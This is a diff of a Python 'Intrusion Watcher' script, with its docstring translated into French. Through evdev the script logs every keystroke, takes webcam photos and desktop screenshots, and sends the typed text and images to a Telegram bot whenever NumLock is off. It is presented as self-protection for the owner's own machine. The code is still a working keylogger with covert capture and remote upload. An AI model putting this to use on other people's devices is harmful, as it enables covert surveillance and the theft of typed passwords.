@@ -2,24 +2,25 @@
 """
 Intrusion Watcher with Local Logging
 ------------------------------------
-Monitors keyboard and mouse activity using evdev.  
-When NumLock is OFF, any activity triggers:
-  - Keylogger (append typed characters to buffer and log file)
-  - Webcam capture (fswebcam)
-  - Desktop screenshot (scrot)
-  - Telegram alert (message + media)
+Surveille l’activité clavier et souris via evdev.
+Quand NumLock est **OFF**, toute activité déclenche :
+  - enregistrement des touches dans un fichier log
+  - capture webcam (fswebcam)
+  - capture d’écran (scrot en JPG)
+  - envoi d’alerte Telegram (texte + images)
 
-Features:
-  - NumLock acts as ON/OFF switch for monitoring
-  - Global cooldown: 3s between alerts
-  - Local log file with timestamps of typed keys
+Fonctionnalités :
+  - NumLock agit comme interrupteur ON/OFF
+  - Cooldown global : 3 secondes entre deux alertes
+  - Fichier log local horodaté
+  - La touche NumLock est ignorée pour éviter les faux positifs
 
-Setup:
+Prérequis :
     sudo apt install fswebcam scrot python3-evdev
     pip install requests
-Environment variables:
+Variables d’environnement requises :
     TG_BOT_TOKEN = "<telegram bot token>"
-    TG_CHAT_ID   = "<chat id or group id>"
+    TG_CHAT_ID   = "<chat id ou group id>"
 """
 
 import os
@@ -31,35 +32,39 @@ from evdev import InputDevice, list_devices, ecodes
 from select import select
 
 # =====================
-# Telegram integration
+# Config & Telegram
 # =====================
 
 TELEGRAM_TOKEN = os.getenv("TG_BOT_TOKEN")
 CHAT_ID = os.getenv("TG_CHAT_ID")
 
 if not TELEGRAM_TOKEN or not CHAT_ID:
-    raise RuntimeError("⚠️ Environment variables TG_BOT_TOKEN and TG_CHAT_ID are required")
+    raise RuntimeError("Environment variables TG_BOT_TOKEN and TG_CHAT_ID are required")
 
 def send_telegram_message(msg: str) -> None:
-    """Send a plain text message to Telegram."""
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     try:
-        requests.post(url, data={"chat_id": CHAT_ID, "text": msg}, timeout=5)
+        r = requests.post(url, data={"chat_id": CHAT_ID, "text": msg}, timeout=5)
+        if not r.ok:
+            print("Telegram message error:", r.text)
     except Exception as e:
         print("Telegram message error:", e)
 
 def send_telegram_photo(photo_path: str, caption: str = "") -> None:
-    """Send a photo with optional caption to Telegram."""
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
     try:
         with open(photo_path, "rb") as f:
-            requests.post(url, data={"chat_id": CHAT_ID, "caption": caption},
-                          files={"photo": f}, timeout=10)
+            mime = "image/jpeg" if photo_path.endswith(".jpg") else "image/png"
+            files = {"photo": (os.path.basename(photo_path), f, mime)}
+            r = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption},
+                              files=files, timeout=10)
+            if not r.ok:
+                print("Telegram photo error:", r.text)
     except Exception as e:
         print("Telegram photo error:", e)
 
 # =====================
-# Keylogger setup
+# Keymap
 # =====================
 
 KEYMAP = {
@@ -79,7 +84,7 @@ KEYMAP = {
 }
 
 # =====================
-# Capture + logging
+# Capture & Logging
 # =====================
 
 OUTPUT_DIR = Path.home() / "security"
@@ -87,62 +92,52 @@ OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
 LOG_FILE = OUTPUT_DIR / "intrusion_log.txt"
 
 def append_to_log(entry: str) -> None:
-    """Append a timestamped entry to the local log file."""
     ts = time.strftime("%Y-%m-%d %H:%M:%S")
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(f"[{ts}] {entry}\n")
 
 def take_screenshot() -> Path:
-    """Capture a screenshot of the desktop using scrot."""
     ts = time.strftime("%Y%m%d_%H%M%S")
-    filename = OUTPUT_DIR / f"screenshot_{ts}.png"
-    subprocess.run(["scrot", str(filename)])
+    filename = OUTPUT_DIR / f"screenshot_{ts}.jpg"
+    subprocess.run(["scrot", str(filename)], check=True)
+    time.sleep(0.2)
     return filename
 
 def take_webcam_photo(source: str) -> Path:
-    """Capture a webcam picture using fswebcam."""
     filename = OUTPUT_DIR / f"intrusion_{source}_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
-    subprocess.run(["fswebcam", str(filename)])
+    subprocess.run(["fswebcam", str(filename)], check=True)
+    time.sleep(0.2)
     return filename
 
 # =====================
-# Intrusion handling
+# Intrusion Handling
 # =====================
 
-last_intrusion_time = 0  # cooldown timer
-typed_buffer = ""        # accumulate typed text
+last_intrusion_time = 0
+typed_buffer = ""
 
 def record_intrusion(source: str, typed_text: str = "") -> None:
-    """Handle an intrusion event: capture media, log locally, and notify Telegram."""
     global last_intrusion_time
     now = time.time()
-
-    # Cooldown: avoid spamming
     if now - last_intrusion_time < 3:
         return
     last_intrusion_time = now
 
     ts = time.strftime("%Y-%m-%d %H:%M:%S")
-
-    # Capture media
     photo_file = take_webcam_photo(source)
     screenshot_file = take_screenshot()
 
-    # Prepare caption
     caption = f"Intrusion via {source} at {ts}"
     if typed_text:
         caption += f"\nTyped so far: {typed_text}"
 
-    # Local logging
     append_to_log(caption)
-
-    # Send to Telegram
     send_telegram_message(caption)
     send_telegram_photo(str(photo_file), caption="📷 Webcam")
     send_telegram_photo(str(screenshot_file), caption="🖥️ Screenshot")
 
 # =====================
-# Device auto-detection
+# Device Detection
 # =====================
 
 keyboards, mice, numlock_dev = [], [], None
@@ -163,17 +158,19 @@ for path in list_devices():
         print(f"[+] Mouse: {dev.path} ({dev.name})")
 
 devices = []
-if numlock_dev: devices.append(numlock_dev)
+if numlock_dev:
+    devices.append(numlock_dev)
 devices.extend(keyboards)
 devices.extend(mice)
 fds = {dev.fd: dev for dev in devices}
 
 numlock_on = ecodes.LED_NUML in numlock_dev.leds() if numlock_dev else False
+surveillance_enabled = not numlock_on  # actif quand NumLock est OFF
 
 print("🎯 Intrusion Watcher running (active when NumLock OFF, cooldown 3s)")
 
 # =====================
-# Main event loop
+# Main Loop
 # =====================
 
 while True:
@@ -181,21 +178,23 @@ while True:
     for fd in r:
         dev = fds[fd]
         for event in dev.read():
-            # NumLock toggle
             if dev == numlock_dev and event.type == ecodes.EV_LED and event.code == ecodes.LED_NUML:
                 numlock_on = bool(event.value)
                 print("NumLock =", "ON" if numlock_on else "OFF")
+                surveillance_enabled = not numlock_on
+                if not surveillance_enabled:
+                    typed_buffer = ""
                 continue
 
-            if not numlock_on:
-                # Keyboard handling
+            if surveillance_enabled:
                 if dev in keyboards and event.type == ecodes.EV_KEY and event.value == 1:
+                    if event.code == ecodes.KEY_NUMLOCK:
+                        continue  # ignorer la touche NumLock
                     char = KEYMAP.get(event.code, f"[{event.code}]")
                     typed_buffer += char
                     append_to_log(f"Key pressed: {char}")
                     record_intrusion("keyboard", typed_buffer)
 
-                # Mouse handling
                 elif dev in mice:
                     if event.type == ecodes.EV_KEY and event.value == 1:
                         append_to_log("Mouse click detected")
